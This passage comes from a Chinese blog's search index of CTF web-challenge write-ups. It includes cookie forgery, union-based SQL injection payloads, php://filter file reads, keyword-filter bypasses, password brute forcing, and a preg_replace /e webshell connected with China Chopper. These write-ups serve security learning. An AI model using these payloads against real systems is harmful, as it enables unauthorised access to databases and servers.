c.substring(m.d,c.d)&#125;p\"\"&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=\"\";o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=\"user\";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\\';\\');5 e=\"\";o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(\"A\"))&#123;e=8[i+1].n(\":\")[2]&#125;&#125;e=e.B(\\'\"\\',\"\").B(\\'\"\\',\"\");9.write(\\'&lt;img id=\"f-1\" g=\"h/1-1.k\"&gt;\\');j(7()&#123;9.l(\"f-1\").g=\"h/1-2.k\"&#125;,1000);j(7()&#123;9.l(\"f-1\").g=\"h/1-3.k\"&#125;,2000);j(7()&#123;9.l(\"f-1\").g=\"h/1-4.k\"&#125;,3000);j(7()&#123;9.l(\"f-1\").g=\"h/6.png\"&#125;,4000);j(7()&#123;alert(\"浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;\"+md5(e)+\"&#125;\")&#125;,5000)&#125;', [], 38, '|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'.split('|'), 0, &#123;&#125;) 删除eval在浏览器的控制台跑出的结果 在线代码格式化后如下 function getCookie(cname) &#123; var name = cname + \"=\"; var ca = document.cookie.split(';'); for (var i = 0; i &lt; ca.length; i++) &#123; var c = ca[i].trim(); if (c.indexOf(name) == 0) return c.substring(name.length, c.length) &#125; return \"\" &#125; function decode_create(temp) &#123; var base = new Base64(); var result = base.decode(temp); var result3 = \"\"; for (i = 0; i &lt; result.length; i++) &#123; var num = result[i].charCodeAt(); num = num ^ i; num = num - ((i % 10) + 2); result3 += String.fromCharCode(num) &#125; return result3 &#125; function ertqwe() &#123; var temp_name = \"user\"; var temp = getCookie(temp_name); temp = decodeURIComponent(temp); var mingwen = decode_create(temp); var ca = mingwen.split(';'); var key = \"\"; for (i = 0; i &lt; ca.length; i++) &#123; if (-1 &lt; ca[i].indexOf(\"flag\")) &#123; key = ca[i + 1].split(\":\")[2] &#125; &#125; key = key.replace('\"', \"\").replace('\"', \"\"); document.write('&lt;img id=\"attack-1\" src=\"image/1-1.jpg\"&gt;'); setTimeout(function () &#123; document.getElementById(\"attack-1\").src = \"image/1-2.jpg\" &#125;, 1000); setTimeout(function () &#123; document.getElementById(\"attack-1\").src = \"image/1-3.jpg\" &#125;, 2000); setTimeout(function () &#123; document.getElementById(\"attack-1\").src = \"image/1-4.jpg\" &#125;, 3000); setTimeout(function () &#123; document.getElementById(\"attack-1\").src = \"image/6.png\" &#125;, 4000); setTimeout(function () &#123; alert(\"浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;\" + md5(key) + \"&#125;\") //发现了flag字段 &#125;, 5000) &#125; 首先在控制台中获取cookie getCookie(\"user\"); 获取cookie，使用上面的js代码一步一步解码 最后会获取序列化后的一串字符串 最后解出来的cookie值 O:5:\"human\":10:&#123;s:8:\"xueliang\";i:615;s:5:\"neili\";i:657;s:5:\"lidao\";i:76;s:6:\"dingli\";i:72;s:7:\"waigong\";i:0;s:7:\"neigong\";i:0;s:7:\"jingyan\";i:0;s:6:\"yelian\";i:0;s:5:\"money\";i:0;s:4:\"flag\";s:1:\"0\";&#125; 但是会发现money的值为0，所以下面的思路就是通过修改cookie中money值之后反编码成题目中的格式，抓包修改cookie后买技能打怪拿到flag 改cookie的方法就是将明文逆向编码： 刚开始写了挺久的逆向解密，发现调用base64中的encode时，怎么也解不出原来的加密代码，encode怎么也加密不出原来的cookie。猜想一定是base64.js有问题： 发现加密过程并不对应，encode调用了_utf8_encode但decode并没有调用_utf8_encode，所以需要对编码过程进行相应的修改 修改后的反编码过程，将其放到html文件中，浏览器运行即可出结果 //1.html &lt;script&gt; function Base64() &#123; // private property _keyStr = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; // public method for encoding this.encode = function (input) &#123; var output = \"\"; var chr1, chr2, chr3, enc1, enc2, enc3, enc4; var i = 0; //input = _utf8_encode(input); (注释掉这个函数调用) while (i &lt; input.length) &#123; chr1 = input.charCodeAt(i++); chr2 = input.charCodeAt(i++); chr3 = input.charCodeAt(i++); enc1 = chr1 &gt;&gt; 2; enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4); enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6); enc4 = chr3 &amp; 63; if (isNaN(chr2)) &#123; enc3 = enc4 = 64; &#125; else if (isNaN(chr3)) &#123; enc4 = 64; &#125; output = output + _keyStr.charAt(enc1) + _keyStr.charAt(enc2) + _keyStr.charAt(enc3) + _keyStr.charAt(enc4); &#125; return output; &#125; // public method for decoding this.decode = function (input) &#123; var output = \"\"; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \"\"); while (i &lt; input.length) &#123; enc1 = _keyStr.indexOf(input.charAt(i++)); enc2 = _keyStr.indexOf(input.charAt(i++)); enc3 = _keyStr.indexOf(input.charAt(i++)); enc4 = _keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4); chr2 = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2); chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4; output = output + String.fromCharCode(chr1); if (enc3 != 64) &#123; output = output + String.fromCharCode(chr2); &#125; if (enc4 != 64) &#123; output = output + String.fromCharCode(chr3); &#125; &#125; //output = _utf8_decode(output); return output; &#125; // private method for UTF-8 encoding _utf8_encode = function (string) &#123; string = string.replace(/\\r\\n/g,\"\\n\"); var utftext = \"\"; for (var n = 0; n &lt; string.length; n++) &#123; var c = string.charCodeAt(n); if (c &lt; 128) &#123; utftext += String.fromCharCode(c); &#125; else if((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123; utftext += String.fromCharCode((c &gt;&gt; 6) | 192); utftext += String.fromCharCode((c &amp; 63) | 128); &#125; else &#123; utftext += String.fromCharCode((c &gt;&gt; 12) | 224); utftext += String.fromCharCode(((c &gt;&gt; 6) &amp; 63) | 128); utftext += String.fromCharCode((c &amp; 63) | 128); &#125; &#125; return utftext; &#125; // private method for UTF-8 decoding _utf8_decode = function (utftext) &#123; var string = \"\"; var i = 0; var c = c1 = c2 = 0; while ( i &lt; utftext.length ) &#123; c = utftext.charCodeAt(i); if (c &lt; 128) &#123; string += String.fromCharCode(c); i++; &#125; else if((c &gt; 191) &amp;&amp; (c &lt; 224)) &#123; c2 = utftext.charCodeAt(i+1); string += String.fromCharCode(((c &amp; 31) &lt;&lt; 6) | (c2 &amp; 63)); i += 2; &#125; else &#123; c2 = utftext.charCodeAt(i+1); c3 = utftext.charCodeAt(i+2); string += String.fromCharCode(((c &amp; 15) &lt;&lt; 12) | ((c2 &amp; 63) &lt;&lt; 6) | (c3 &amp; 63)); i += 3; &#125; &#125; return string; &#125; &#125; //原来cookie var temp = \"UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE=\"; //进行加密，获取明文 var base = new Base64(); var result = base.decode(temp); var result3 = \"\"; for (i = 0; i &lt; result.length; i++) &#123; var num = result[i].charCodeAt(); num = num ^ i; num = num - ((i % 10) + 2); result3 += String.fromCharCode(num); &#125; document.write(\"原明文：\"+result3+'&lt;br/&gt;'); document.write('&lt;br/&gt;'); var result3 = 'O:5:\"human\":10:&#123;s:8:\"xueliang\";i:830;s:5:\"neili\";i:602;s:5:\"lidao\";i:95;s:6:\"dingli\";i:63;s:7:\"waigong\";i:0;s:7:\"neigong\";i:0;s:7:\"jingyan\";i:0;s:6:\"yelian\";i:0;s:5:\"money\";i:200000;s:4:\"flag\";s:1:\"0\";&#125;'; //反编码获取cookie var result = \"\"; for (i = 0;i&lt;result3.length;i++)&#123; num = result3[i].charCodeAt(); num = num + ((i % 10) + 2); num = num ^ i; result += String.fromCharCode(num); &#125; var temp= base.encode(result); //将cookie进行url编码 temp = encodeURIComponent(temp); document.write(\"cookie:\"+temp+\"&lt;/br&gt;\"); &lt;/script&gt; 编码结果 UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo%2FBTzBxKbu6fbrB%2BH%2Bps3nsLrP6dCs0LgR8fj1%2F%2B6y3%2B%2FapJ3XnJnkjNPf0NnRjpPD7paIiIiIhovBiIL4kNTK0dea%2F7mC%2B4bu%2FOr1SQ%3D%3D 这就是我们期待的cookie,然后用工具修改cookie 修满属性值打怪拿到flag 参考 这道题虽然很难，但是在一步一步尝试的过程中学到很多有用的东西，收获还是很大的，感谢师傅的wp，看了好久才做出了。","tags":[{"name":"脚本","slug":"脚本","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"cookie","slug":"cookie","permalink":"https://sunzhengyu99.github.io/tags/cookie/"},{"name":"编码","slug":"编码","permalink":"https://sunzhengyu99.github.io/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"bugku1-10","date":"2020-09-06T14:26:41.000Z","path":"2020/09/06/bugku1-10/","text":"bugku刷题记录1 web2查看源码即可 计算器修改前端代码 GETpayload: ?what=flag POSTPOST: what=flag 矛盾payload: ?num=1a 考察点：弱类型比较 === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较 测试代码 &lt;?php var_dump(\"admin\"==0); //true var_dump(\"1admin\"==1); //true var_dump(\"admin1\"==1) //false var_dump(\"admin1\"==0) //true var_dump(\"0e123456\"==\"0e4456789\"); //true ?&gt; //上述代码可自行测试 1 观察上述代码，\"admin\"==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等 2 \"1admin\"==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是\"admin1\"被转化成了0,为什么呢？？ 3 \"0e123456\"==\"0e456789\"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等 web3查看源码后，在最下面看到一串编码，为unicode编码 &amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; 使用工具转换为字符串 域名解析dns服务器用来解析域名为IP，很多国外的服务器不能访问，主要原因就是DNS服务器不能解析那些域名 hosts就是本地用来解析域名为IP 因此hosts文件中有的域名记录，在本电脑浏览器中可直接使用域名访问 （hosts文件需要管理员权限，修改方式为使用管理员权限运行记事本后打开hosts） 路径为： C:\\Windows\\System32\\drivers\\etc 文件保存后在浏览器中访问该域名 获得flag 你必须让他停下打开页面什么也没有，源码也没有什么发现，抓包试试 go完也没什么反应，有点迷惑 但是多go几次后，发现有张图片在变 多go几次就出来了flag,原理还未知 变量1 &lt;?php error_reporting(0); include \"flag1.php\"; highlight_file(__file__); if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; die(\"args error!\"); &#125; eval(\"var_dump($$args);\"); &#125; ?&gt; 首先看到要用get方式提交一个args参数，而在最后一行代码里又有var_dump(&amp;&amp;args)，于是传入args参数的值为GLOBALS,这样最后一行代码就变成了var_dump（&amp;GLOBALS），然后var_dump函数运行会输出所有变量，得出flag。 Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。 GLOBALS:一个包含了全部变量的全局组合数组 即将include”flag.php”作为全局变量在本页面输出 ?args=GLOBALS web5源码中一串特别的代码jsfuck, 直接放在浏览器的控制台中运行 头等舱打开页面什么也没有 扫描目录，扫出来一大堆没用的，直接抓包 。。。。就出来了 网站被黑名字提示了，网站被黑。 打开题目，发现鼠标动不了，可能是被黑后的后遗症 先扫描目录发现了shell.php,这可能是上次黑客留下的小马文件 打开页面，需要密码，这就需要爆破了(密码为hack) 确定要爆破的变量 加载密码字典 出现结果（根据length确定密码） 密码为hack 登录即可 管理员系统随便输入一个账号发现提示IP 想到了X-FORWORADED-FOR:127.0.0.1 抓包试试 在响应包中发现一段base64编码dGVzdDEyMw== 解密后为test123，猜测为登录密码 结果真对了 当然这题也可以使用爆破的方法做，但是密码字典需要包含test123 web4查看源码发现一段js代码 将最后的eval改成alert(),直接在浏览器中运行弹出结果 function checkSubmit()&#123; var a=document.getElementById(\"password\"); if(\"undefined\"!=typeof a)&#123; if(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value) return!0; alert(\"Error\"); a.focus(); return!1&#125; &#125; document.getElementById(\"levelQuest\").onsubmit=checkSubmit; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value) 直接输入67d709b2b54aa2aa648cf6e87a7114f1 flag在index里题目已经提示了flag的位置应该在index.php中，那么获取index.php的源码就很关键，可是查看源码什么也没有 注意到了url:http://123.206.87.240:8005/post/index.php?file=show.php 出现file这个参数，想到了文件包含的漏洞 用下面的payload,获取index.php，源码的base64值 ?file=php://filter/read=convert.base64-encode/resource=index.php PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== 解码为 &lt;html&gt; &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125; ?&gt; &lt;&#x2F;html&gt; 获取flag{edulcni_elif_lacol_si_siht} 请输入密码提示了5位数的密码，直接爆破，可用burpsuit的爆破模块 备份是个好习惯打开题目后，出现一段代码，应该是md5值，可是解码为空密码 扫描目录python dirsearch.py -u http://123.206.87.240:8002/web16/ -e php 发现了index.php.bak 这个应该是在编辑这个文件时，自动生成的备份文件；EDITPLUS 这类的文本编辑器在编辑文件时会产生这样的备份；如果编辑后没有什么问题；可以删除.BAK文件 (来自百度) 下载.bak文件打开后，发现源码，开始审计 &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once \"flag.php\"; ini_set(\"display_errors\", 0); $str = strstr($_SERVER['REQUEST_URI'], '?'); $str = substr($str,1); $str = str_replace('key','',$str);//对key进行了过滤 parse_str($str); echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;//这里需要使用md()函数对数组处理时的漏洞 echo $flag.\"取得flag\"; &#125; ?&gt; url:http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a成绩单打开页面像是注入的题目 测试一些 1' and 1=1 # 1' and 1=2 # 第一个语句正常，第二个语句不显示内容，可以判断存在注入点 1.判断字段数1' order by 4 # 2.爆数据库-1&apos; union select 1,database(),3,4 # database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag (select skctf_flag from skctf_flag.fl4g) 秋名山车神看到题目就知道需要用python的脚本来做 import requests import re url='http://120.24.86.145:8002/qiumingshan/' r=requests.session() requestpage = r.get(url) ans=re.findall('&lt;div&gt;(.*?)=?;&lt;/div&gt;',requestpage.text)#获取表达式 ans=\"\".join(ans)#列表转为字符串 ans=ans[:-2]#去掉最后的=? post=eval(ans)#计算表达式的值 data=&#123;'value':post&#125;#构造post的data部分 flag=r.post(url,data=data) print(flag.text)","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"域名解析","slug":"域名解析","permalink":"https://sunzhengyu99.github.io/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"},{"name":"爆破","slug":"爆破","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%86%E7%A0%B4/"},{"name":"脚本","slug":"脚本","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"}]},{"title":"综合2","date":"2020-09-03T07:24:29.000Z","path":"2020/09/03/综合2/","text":"NCTF-综合2 进入页面，没什么特别的地方，随便点点 留言可以正常提交，本以为有xss,但是已经提示不是xss 看到最下面有个网站说明 本CMS说明 ，有用的内容如下 config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索 admin表结构 create table admin ( id integer, username text, userpass text, ) http://cms.nuptzj.cn/about.php?file=sm.txt可以使用php伪协议任意读取文件内容。 包括自己 尝试读取index.php的源码，发现好像并没有什么用 读取about.php &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;?php $file&#x3D;$_GET[&#39;file&#39;]; if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123; &#x2F;&#x2F; 有config.php echo &quot;file参数不能为空！&quot;; exit(); &#125;else&#123; $cut&#x3D;strchr($file,&quot;loginxlcteam&quot;); &#x2F;&#x2F;包含了 loginxlcteam页面 if($cut&#x3D;&#x3D;false)&#123; $data&#x3D;file_get_contents($file); $date&#x3D;htmlspecialchars($data); echo $date; &#125;else&#123; echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;; &#125; &#125; 读取config.php，无有用信息 查看loginxlcteam,是个登录页面 到此还是无从下手，参考大佬的博客 https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase 在搜索页面中也存在有用信息 http://cms.nuptzj.cn/about.php?file=so.php获取源码 &lt;?php //so.php if($_SERVER['HTTP_USER_AGENT']!=\"Xlcteam Browser\")&#123; //必须修改http头，吧user-agent改成Xlcteam Browser echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'; exit(); &#125; $id=$_POST['soid']; //post 一个soid include 'config.php'; include 'antiinject.php'; //防注入的文件 include 'antixss.php'; //防xss的文件 $id=antiinject($id); //对id过滤 $con = mysql_connect($db_address,$db_user,$db_pass) or die(\"不能连接到数据库！！\".mysql_error()); mysql_select_db($db_name,$con); $id=mysql_real_escape_string($id); $result=mysql_query(\"SELECT * FROM `message` WHERE display=1 AND id=$id\"); //sql查询，可能存在注入点 $rs=mysql_fetch_array($result); echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;'; mysql_free_result($result); mysql_free_result($file); mysql_close($con); ?&gt; &lt;?php //antiinject.php源码 function antiinject($content) &#123; $keyword=array(\"select\",\"union\",\"and\",\"from\",' ',\"'\",\";\",'\"',\"char\",\"or\",\"count\",\"master\",\"name\",\"pass\",\"admin\",\"+\",\"-\",\"order\",\"=\"); //对一些sql注入时用到的关键词进行了过滤 $info=strtolower($content); for($i=0;$i&lt;=count($keyword);$i++) &#123; $info=str_replace($keyword[$i], '',$info); &#125; return $info; &#125; ?&gt; 大致意思就是 1.判断http请求头中的user-agent参数是否为Xlcteam Browser 2.post参数soid 3.对soid进行过滤后带入sql语句中查询 于是抓包修改user-agent 确定存在注入点 由于之前提示了admin表结构 create table admin ( id integer, username text, userpass text, ) 可直接写出查询语句 (sselectelect/**/group_concat(userppassass)/**/ffromrom/**/aadmindmin) ASCII码转字符串结果为： fuckruntu 登录 http://cms.nuptzj.cn/about.php?file=xlcteam.php 查看源码 &lt;?php $e = $_REQUEST['www']; $arr = array($_POST['wtf'] =&gt; '|.*|e',); array_walk($arr, $e, ''); ?&gt; 看样子是可以用菜刀连接的 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：参考https://www.jb51.net/article/38714.htm简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。用菜刀连接： url:http://cms.nuptzj.cn/xlcteam.php?www=preg_replace 密码：wtf 总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"shell","slug":"shell","permalink":"https://sunzhengyu99.github.io/tags/shell/"}]},{"title":"nctf-2","date":"2020-09-02T09:13:08.000Z","path":"2020/09/02/nctf-2/","text":"NCTF-2 SQL注入1题目源码给出 &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\"admin\") &#123; echo \"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;\"; &#125; if($query[user] != \"admin\") &#123; echo(\"&lt;p&gt;You are not admin!&lt;/p&gt;\"); &#125; &#125; echo $query[user]; ?&gt; 首先post方法传递user和pass两个参数，然后带入sql语句中查询 注入点在这个位置 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot; select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;) 构造语句 select user from ctf where (user=&#39;admin&#39;) or 1=1 #) and (pw=&#39;&#39;) 在username中填入admin&#39;) or 1=1 #或者admin&#39;) and 1=1 #，提交即可获得flag passcheck$pass=@$_POST['pass']; $pass1=***********;//被隐藏起来的密码 if(isset($pass)) &#123; if(@!strcmp($pass,$pass1))&#123; echo \"flag:nctf&#123;*&#125;\"; &#125;else&#123; echo \"the pass is wrong!\"; &#125; &#125;else&#123; echo \"please input pass!\"; &#125; ?&gt; strcmp() 函数比较两个字符串。 注释：strcmp() 函数是二进制安全的，且对大小写敏感。 提示：该函数与 strncmp() 函数类似，不同的是，通过 strncmp() 您可以指定每个字符串用于比较的字符数。 只有pass==pass1时才显示flag 感觉跟之前的变量覆盖相似 知识点： strcmp()函数 ：php5.3之前的strcmp的漏洞，当参数中的一个字符串是对象或者数组时，函数会返回0； hackbar的使用，post方法 php弱类型，数组的使用。 参考： https://www.cnblogs.com/islsy/p/10667426.html 起名字真难&lt;?php function noother_says_correct($number) &#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) //number中的数字不能在1-9 &#123; return false; &#125; &#125; return $number == '54975581388'; //number的值等于54975581388，与之前if语句矛盾 &#125; $flag='*******'; if(noother_says_correct($_GET['key'])) echo $flag; else echo 'access denied'; ?&gt; 尝试将54975581388转成十六进制 0xccccccccc, c的a值为12，满足if判断语句 ?key=0xccccccccc sqlinject查看源码 &lt;!-- #GOAL: login as admin,then get the flag; error_reporting(0); require 'db.inc.php'; function clean($str)&#123; if(get_magic_quotes_gpc())&#123; //防止注入 $str=stripslashes($str); //添加 \\ &#125; return htmlentities($str, ENT_QUOTES);//过滤掉单引号，双引号，或者兼而有之 &#125; $username = @clean((string)$_GET['username']);//对获取的参数进行了处理 $password = @clean((string)$_GET['password']); $query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';//存在注入的语句 $result=mysql_query($query); if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!'); &#125; echo $flag; --&gt; magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误 SELECT * FROM users WHERE name=\\&#39;&#39;.$username.&#39;\\&#39; AND pass=\\&#39;&#39;.$password.&#39;\\&#39;; 反斜杠遇到单引号后，起到转义作用，实际sql语句如下 SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;; 这里注入与之前的注入不同，这里针对的是password SELECT * FROM users WHERE name=&#39; \\&#39; AND pass=&#39; or 1=1 --+&#39;; \\&#39; AND pass= 作为name 参数的值 所以构造?name=&amp;password=or 1=1 –+ SQL注入2&lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) &#123; //post 方式接收两个参数 mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]);//对pass md5加密 $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\"));//获取pw字段的值 if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; // 比较pass和pw echo \"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;\"; &#125; else &#123; echo(\"&lt;p&gt;Log in failure!&lt;/p&gt;\"); &#125; &#125; ?&gt; poyload: user= &#39; union select md(1) &amp;pass=1 select pw from ctf where user=&#39;&#39; union select md(1) 此查询语句获得我pw值为md(1),所以if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))语句成立，显示flag (还没完全理解) 综合题 首页中给出很长的jsfuck，可以使用浏览器的console解码 ,给出一个页面 访问 1bc29b36f623ba82aaf6724fd3b16718.php 提示在header里 查看header history of bash 如果使用的是bash，在家目录中会生成.bash_history文件用来保存历史命令。访问.bash_history文件，可以得到这样的历史命令 url: 